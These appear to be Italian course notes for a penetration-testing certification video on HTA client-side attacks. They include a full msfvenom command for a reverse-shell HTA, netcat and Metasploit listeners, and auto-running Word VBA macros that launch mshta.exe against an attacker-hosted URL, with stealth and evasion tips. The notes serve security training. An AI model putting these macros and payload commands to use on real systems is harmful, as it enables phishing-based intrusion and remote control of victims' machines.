# 020 — HTA Attacks (Client-Side Attacks)

> **Modulo:** Client-Side Attacks · **Video:** 20/26
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Fonte appunti:** [020_HTA Attacks.txt](020_HTA Attacks.txt) · [020_HTA Attacks.srt](020_HTA Attacks.srt)

## Concetti chiave

- **`msfvenom -f hta-psh`** genera un HTA pronto per reverse shell (uses VBScript + base64-encoded PowerShell).
- Due vettori operativi dimostrati: (1) **Browser/IE** → vittima visita URL, esegue HTA con privilegi user; (2) **VBA macro** che invoca **`mshta.exe http://atk/shell.hta`**.
- Listener: handler standard `multi/handler` con `windows/shell_reverse_tcp` (non-staged → meno setup).
- Esecuzione via IE → user spesso `IEUser` (basso privilegio in VM demo Microsoft); esecuzione via `mshta` da macro → privilegi del current user (es. `Administrator`).
- Catena multi-stadio classica: **doc Office → VBA macro → `mshta http://...hta` → PowerShell encoded → reverse shell**.

## Spiegazione approfondita

### Generazione HTA reverse shell con msfvenom
```bash
msfvenom -p windows/shell_reverse_tcp \
  LHOST=192.168.2.134 LPORT=4444 \
  -f hta-psh -o /var/www/html/shell.hta
```
- `-p windows/shell_reverse_tcp` = non-staged → handlable con `nc` o `multi/handler`.
- `-f hta-psh` = HTA con VBScript wrapper + payload PowerShell base64.
- Output salvato in webroot Apache → accessibile via `http://atk/shell.hta`.

Contenuto generato: VBScript con `CreateObject("WScript.Shell")`, `CreateObject("Scripting.FileSystemObject")`, e una `powershell -EncodedCommand <BASE64>` enorme con shellcode reverse.

### Listener
```bash
# Opzione 1: nc semplice
nc -nvlp 4444

# Opzione 2: Metasploit
use exploit/multi/handler
set PAYLOAD windows/shell_reverse_tcp
set LHOST 192.168.2.134
set LPORT 4444
run
```

### Vettore A — Browser (IE)
1. Apache su Kali serve `/var/www/html/shell.hta`.
2. Su Win10 Enterprise (IE installato): IE → `http://192.168.2.134/shell.hta`.
3. IE → "Open" → "Allow" → `mshta.exe` esegue HTA → reverse shell.
4. `whoami` → es. `ieuser` (VM Microsoft MSEdge); `whoami /priv` mostra privilegi limited (non service-bound).

### Vettore B — VBA macro che invoca mshta
Macro nel Word document:
```vba
Sub AutoOpen()
    ExecuteHTA
End Sub
Sub Document_Open()
    ExecuteHTA
End Sub

Sub ExecuteHTA()
    Dim url As String
    Dim cmd As String
    url = "http://192.168.2.134/shell.hta"
    cmd = "mshta.exe " & url
    Shell cmd, vbNormalFocus  ' o vbHide per stealth
End Sub
```
- La macro NON contiene il payload — chiama solo `mshta` con URL remoto.
- Edge Chromium su Win moderno → HTA da browser non funziona, ma **`mshta.exe`** sì → questo è il workaround universal.
- Permette di mantenere la macro VBA minimalista e cambiare l'HTA server-side.

### Privilegi
- Browser IE → si eredita il context del processo IE/utente (spesso restricted in lab Microsoft).
- VBA → `Shell mshta` → il nuovo processo gira come l'utente che ha aperto Word → tipicamente full user (es. Admin se l'utente è admin).

### Vantaggi catena VBA + HTA
- **Macro piccola** (poche righe) → meno superficie di detection statica.
- **Payload aggiornabile** lato server senza ri-distribuire il doc.
- **`mshta.exe`** = LOLBin trusted, raramente bloccato da AppLocker default.
- Possibilità di **encoding multiplo** (base64 PS dentro VBScript dentro HTA).

### Alternativi a `hta-psh`
- **PowerShell Empire `hta` stager** — genera HTA che si aggancia all'agent Empire.
- HTA custom scritti a mano (vedi video 019) con `IEX (New-Object Net.WebClient).DownloadString(...)`.

## Comandi & strumenti

| Comando | Scopo |
|---|---|
| `msfvenom -p windows/shell_reverse_tcp LHOST=… LPORT=… -f hta-psh -o shell.hta` | Genera HTA reverse shell |
| `nc -nvlp 4444` | Listener semplice per shell non-staged |
| `mshta.exe http://atk/shell.hta` | Esecuzione diretta HTA remoto |
| VBA `Shell "mshta.exe " & url` | Invocazione mshta da macro |
| Apache `/var/www/html/` | Webroot per hosting |
| Empire HTA stager | Alternativa C2 |

## Esempi pratici

```bash
# Kali — generation + serve + listen
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.2.134 LPORT=4444 \
  -f hta-psh -o /var/www/html/shell.hta
sudo systemctl start apache2
nc -nvlp 4444
```

```vba
' Word macro che invoca mshta su URL remoto
Sub Document_Open()
    Dim u As String: u = "http://192.168.2.134/shell.hta"
    Shell "mshta.exe " & u, vbHide
End Sub
Sub AutoOpen(): Document_Open: End Sub
```

```cmd
:: Direct invocation senza browser e senza macro
mshta.exe http://192.168.2.134/shell.hta
```

## Punti d'attenzione per l'esame eCPPT

- **Generazione**: `msfvenom -f hta-psh -p windows/shell_reverse_tcp LHOST=… LPORT=… -o file.hta`.
- **Esecuzione**: `mshta.exe <url|path>` (LOLBin, indipendente dal browser).
- Vettore VBA + `mshta` è il pattern più realistico su Windows moderni (no IE richiesto).
- Reverse shell **non-staged** (`shell_reverse_tcp`) → handler = `nc` o `multi/handler`.
- Privilegi della shell = utente che ha aperto il doc → spesso utile per privesc successivo (vedi `getsystem`/UAC bypass).
- `mshta.exe` accetta URL remoti HTTP/HTTPS → esecuzione **fileless dal punto di vista del doc** (nulla scritto su disco prima dell'exec PowerShell).
- Domanda tipica: "Quale eseguibile Windows interpreta i file `.hta`?" → **`mshta.exe`**.

## Collegamenti con altri video

- Precedente: [[019_HTML Applications (HTA)]] — teoria e PoC base.
- Prossimo: [[021_Automating Macro Development with MacroPack - Part 1]]
- Reverse shell PS alternativa: [[016_VBA Reverse Shell Macro with Powercat]].
- ActiveX in HTA (es. WScript.Shell): [[017_Using ActiveX Controls for Macro Execution]].
- Privesc post-shell: modulo **Privilege Escalation**.
- C2 multistage con HTA: modulo **Command & Control (C2)** (PowerShell Empire HTA stager).
